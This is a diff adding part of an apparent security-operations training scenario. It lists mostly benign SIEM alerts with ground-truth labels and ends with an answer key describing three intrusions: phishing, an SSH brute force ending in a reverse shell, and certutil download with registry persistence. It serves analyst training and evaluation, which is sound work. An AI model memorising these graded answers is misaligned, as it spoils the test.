+    summary: "Burst of ICMP echo requests with payload size > 1024 bytes from 10.10.0.50 to 10.30.2.10"
+    relatedAsset: "srv-prod-db-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      packet_size: 1472
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. MTU path discovery diagnostics run by network team from sec-scanner-01."
+
+  - id: alt-031
+    timestamp: "2026-10-12T08:28:44Z"
+    source: "Email Gateway"
+    ruleName: "OUTBOUND_HIGH_VOLUME_RECIPIENTS"
+    severity: "LOW"
+    summary: "User mchen sent marketing announcement to 120 external customer contacts"
+    relatedUser: "mchen"
+    linkedRawEvents: []
+    rawFields:
+      recipient_count: 120
+      subject: "Apex Customer Advisory Webinar"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Approved marketing campaign dispatch from authorized marketing specialist."
+
+  - id: alt-032
+    timestamp: "2026-10-12T08:33:10Z"
+    source: "Authentication"
+    ruleName: "ADMIN_GROUP_MEMBERSHIP_ENUMERATION"
+    severity: "LOW"
+    summary: "Event ID 4799 Domain Admins security group enumerated by monitoring agent"
+    relatedAsset: "dc-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      target_group: "Domain Admins"
+      caller_user: "svc-monitor"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. SIEM active directory audit connector polling privileged account rosters."
+
+  - id: alt-033
+    timestamp: "2026-10-12T08:36:20Z"
+    source: "EDR"
+    ruleName: "KNOWN_BENIGN_TOOL_HASH_MISMATCH"
+    severity: "LOW"
+    summary: "Local git.exe hash differed from baseline cache after developer homebrew upgrade"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    linkedRawEvents: []
+    rawFields:
+      path: "C:\\Program Files\\Git\\cmd\\git.exe"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Developer applied authorized minor software upgrade to local Git client."
+
+  - id: alt-034
+    timestamp: "2026-10-12T08:42:15Z"
+    source: "Network IDS"
+    ruleName: "SNMP_PUBLIC_COMMUNITY_QUERY"
+    severity: "LOW"
+    summary: "SNMP v2 request using community string public observed from 10.10.0.50"
+    relatedAsset: "dc-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      community: "public"
+      port: 161
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Periodic network discovery scan from internal management appliance."
+
+  - id: alt-035
+    timestamp: "2026-10-12T08:47:00Z"
+    source: "Firewall"
+    ruleName: "DNS_TRAFFIC_NON_STANDARD_PORT"
+    severity: "LOW"
+    summary: "UDP DNS traffic to internal resolver on port 5353 (mDNS) dropped at segment boundary"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      proto: "UDP"
+      port: 5353
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Apple Bonjour / zero-conf broadcast from user mobile device on guest subnet."
+
+  - id: alt-036
+    timestamp: "2026-10-12T08:52:19Z"
+    source: "Authentication"
+    ruleName: "CONCURRENT_LOGINS_DIFFERENT_HOSTS"
+    severity: "MEDIUM"
+    summary: "User rpatel authenticated simultaneously on dc-01 and jumpbox srv-jump-01"
+    relatedAsset: "dc-01.corp.internal"
+    relatedUser: "rpatel"
+    linkedRawEvents: []
+    rawFields:
+      hosts: "dc-01, srv-jump-01"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      debrief: "Benign True Positive. System administrator operating dual management terminals during maintenance."
+
+  - id: alt-037
+    timestamp: "2026-10-12T08:58:30Z"
+    source: "EDR"
+    ruleName: "SCHEDULED_TASK_CREATED"
+    severity: "LOW"
+    summary: "Task DefragScheduler registered on srv-prod-db-01 by dba-team"
+    relatedAsset: "srv-prod-db-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      task_name: "DefragScheduler"
+      action: "defrag.exe C:"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Maintenance scheduled task created by certified DBA."
+
+  - id: alt-038
+    timestamp: "2026-10-12T09:01:10Z"
+    source: "Network IDS"
+    ruleName: "HTTP_METHOD_PROPRIETARY_WEBDAV"
+    severity: "LOW"
+    summary: "PROPFIND HTTP method observed between internal office client and intranet portal"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      method: "PROPFIND"
+      target: "/intranet/documents"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Microsoft Office SharePoint synchronization request over WebDAV."
+
+  - id: alt-039
+    timestamp: "2026-10-12T09:03:45Z"
+    source: "Email Gateway"
+    ruleName: "DKIM_SIGNATURE_VERIFICATION_FAILED"
+    severity: "LOW"
+    summary: "Inbound newsletter failed secondary DKIM alignment check"
+    linkedRawEvents: []
+    rawFields:
+      sender: "updates@tech-news.example"
+      dkim_status: "temperror"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Transient DNS timeout during third-party mail provider DKIM verification."
+
+  - id: alt-040
+    timestamp: "2026-10-12T09:07:22Z"
+    source: "EDR"
+    ruleName: "SUSPICIOUS_SYSTEMINFO_COMMAND"
+    severity: "LOW"
+    summary: "systeminfo.exe executed by support agent resolving ticket #4812"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      user: "helpdesk-agent"
+      command: "systeminfo.exe"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Helpdesk technician auditing RAM specifications for finance user hardware ticket."
+
+  - id: alt-041
+    timestamp: "2026-10-12T09:10:00Z"
+    source: "Authentication"
+    ruleName: "ACCOUNT_LOCKED_OUT_SECURITY_ALERT"
+    severity: "LOW"
+    summary: "Service account svc-finance-sync locked after credential rotation delay"
+    linkedRawEvents: []
+    rawFields:
+      account: "svc-finance-sync"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Scheduled credential rotation had 3-minute replication latency across child domains."
+
+  - id: alt-042
+    timestamp: "2026-10-12T09:14:15Z"
+    source: "Network IDS"
+    ruleName: "SSL_UNUSUAL_PORT_DETECTED"
+    severity: "LOW"
+    summary: "TLS handshake negotiated on non-standard port 8443 with internal staging server"
+    relatedAsset: "srv-stage-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      dst_port: 8443
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. Standard developer HTTPS staging port."
+
+  - id: alt-043
+    timestamp: "2026-10-12T09:18:22Z"
+    source: "EDR"
+    ruleName: "CMD_INTERACTIVE_IN_STARTUP_FOLDER"
+    severity: "MEDIUM"
+    summary: "Shortcut to startup folder created by developer installer on ws-eng-09"
+    relatedAsset: "ws-eng-09.corp.internal"
+    relatedUser: "asmith"
+    linkedRawEvents: []
+    rawFields:
+      path: "C:\\Users\\asmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DockerDesktop.lnk"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "LOW"
+      correctEscalation: false
+      debrief: "False Positive. Docker Desktop developer installation registering startup shortcut."
+
+  - id: alt-044
+    timestamp: "2026-10-12T09:22:10Z"
+    source: "Email Gateway"
+    ruleName: "HOMOGLYPH_DOMAIN_WARNING"
+    severity: "LOW"
+    summary: "Sender domain contained international character in header"
+    linkedRawEvents: []
+    rawFields:
+      sender: "contact@global-bank.example"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Approved multinational banking partner sending statement notifications."
+
+  - id: alt-045
+    timestamp: "2026-10-12T09:25:05Z"
+    source: "Firewall"
+    ruleName: "DNS_OVER_HTTPS_BLOCKED"
+    severity: "LOW"
+    summary: "DoH request to 198.51.100.1 blocked to enforce corporate DNS policy"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      destination: "198.51.100.1:443"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Browser default DNS-over-HTTPS setting caught and blocked per corporate policy."
+
+  - id: alt-046
+    timestamp: "2026-10-12T09:27:30Z"
+    source: "Authentication"
+    ruleName: "ANOMALOUS_PRINT_SPOOLER_ACCESS"
+    severity: "LOW"
+    summary: "Print Spooler RPC queried by ws-fin-04 during network printer discovery"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      service: "spoolsv.exe"
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Finance user connecting to floor 2 office printer."
+
+  - id: alt-047
+    timestamp: "2026-10-12T09:29:15Z"
+    source: "EDR"
+    ruleName: "WMIC_LOCAL_STORAGE_QUERY"
+    severity: "LOW"
+    summary: "wmic.exe diskdrive get status invoked by hardware monitoring tool"
+    relatedAsset: "srv-prod-db-01.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      process: "wmic.exe"
+    groundTruth:
+      kind: "benign_true_positive"
+      correctDisposition: "benign_true_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "Benign True Positive. RAID controller SMART diagnostic agent checking disk health."
+
+  - id: alt-048
+    timestamp: "2026-10-12T09:30:00Z"
+    source: "Network IDS"
+    ruleName: "HEURISTIC_SIP_VOIP_TRAFFIC"
+    severity: "LOW"
+    summary: "UDP SIP packet on port 5060 observed during Teams desktop audio test"
+    relatedAsset: "ws-fin-04.corp.internal"
+    linkedRawEvents: []
+    rawFields:
+      port: 5060
+    groundTruth:
+      kind: "false_positive"
+      correctDisposition: "false_positive"
+      correctSeverity: "INFO"
+      correctEscalation: false
+      debrief: "False Positive. Enterprise unified communications VoIP traffic."
+
+groundTruth:
+  incidents:
+    - id: "inc-phish-cred"
+      title: "Credential Theft via Phishing & Account Takeover (jdoe)"
+      category: "credential_access"
+      description: "Phishing lure delivered to Jane Doe in Finance led to credential submission on fake portal, followed by unauthorized external login, mailbox exfiltration rule, and LSASS memory access attempt."
+      timeline:
+        - "2026-10-12T08:14:22Z: Phishing email delivered with invoice lure link"
+        - "2026-10-12T08:16:05Z: User navigated to portal.invoice-secure.example and entered credentials"
+        - "2026-10-12T08:22:18Z: Attacker authenticated from external IP 198.51.100.44"
+        - "2026-10-12T08:25:40Z: Malicious mailbox rule created to forward financial emails to external dropbox"
+        - "2026-10-12T08:27:10Z: Host-level LSASS access attempted on ws-fin-04"
+      truePositiveAlertIds: ["alt-001", "alt-002", "alt-003", "alt-004"]
+      rootCause: "Targeted spear-phishing credential harvesting attack exploiting lack of FIDO2 hardware MFA requirement on legacy web SSO endpoint."
+      mitre: ["T1566.002", "T1078", "T1114.003", "T1003.001"]
+
+    - id: "inc-ssh-bruteforce"
+      title: "External SSH Brute Force and Reverse Shell on DMZ Staging Server"
+      category: "initial_access"
+      description: "External adversary from 203.0.113.88 conducted high-velocity password spraying against staging_deploy account, gained access, dropped second-stage payload via curl, and established interactive reverse shell."
+      timeline:
+        - "2026-10-12T08:31:10Z: High volume SSH password guessing initiated from 203.0.113.88"
+        - "2026-10-12T08:35:45Z: Successful SSH login for staging_deploy"
+        - "2026-10-12T08:38:00Z: curl invoked to pull /tmp/.x11-conf from attacker web server"
+        - "2026-10-12T08:39:10Z: Outbound reverse shell connected to 203.0.113.88:4444"
+      truePositiveAlertIds: ["alt-005", "alt-006", "alt-007", "alt-008"]
+      rootCause: "Weak password on exposed DMZ staging server with SSH password authentication enabled to the public internet."
+      mitre: ["T1110.001", "T1021.004", "T1105", "T1059.004"]
+
+    - id: "inc-lolbin-exec"
+      title: "Living-off-the-Land (Certutil) Download & Registry Persistence (asmith)"
+      category: "execution_and_persistence"
+      description: "Adversary on ws-eng-09 abused certutil.exe to download malicious binary, installed registry Run key persistence under HKCU, and established recurring C2 beaconing."
+      timeline:
+        - "2026-10-12T09:05:12Z: certutil.exe -urlcache executed to pull payload.bin"
+        - "2026-10-12T09:08:44Z: Registry Run key ApexTelemetryAgent created for persistence"
+        - "2026-10-12T09:11:02Z: Encoded PowerShell launched for local discovery"
+        - "2026-10-12T09:12:30Z: Fixed-interval outbound C2 beaconing observed"
+      truePositiveAlertIds: ["alt-009", "alt-010", "alt-011", "alt-012"]
+      rootCause: "Execution of unapproved executable leveraging dual-use Windows management utility (LOLBin) to evade basic perimeter filters."
+      mitre: ["T1105", "T1547.001", "T1059.001", "T1071.001"]
+
+  overallDebrief: |
+    SHIFT OVERVIEW & GRADING DEBRIEF:
+    Apex Dynamics experienced three distinct intrusion chains during this shift:
+    1. A credential-harvesting phishing attack targeting Finance user Jane Doe (ws-fin-04), leading to session hijacking and unauthorized mail forwarding.
+    2. An external SSH brute force compromise on the internet-exposed DMZ staging server (srv-stage-01) culminating in an interactive reverse shell.
+    3. A Living-off-the-Land (LOLBin) attack using certutil.exe and registry persistence on developer workstation ws-eng-09.
+
+    Out of 48 total alerts, 12 represented active malicious attack milestones across these 3 incidents.
+    The remaining 36 alerts were benign true positives, false positives, or duplicate firewall telemetry.
+    Successful analysts correctly classified the true attacks, escalated with concise reasoning, and avoided over-escalating the routine IT maintenance noise.
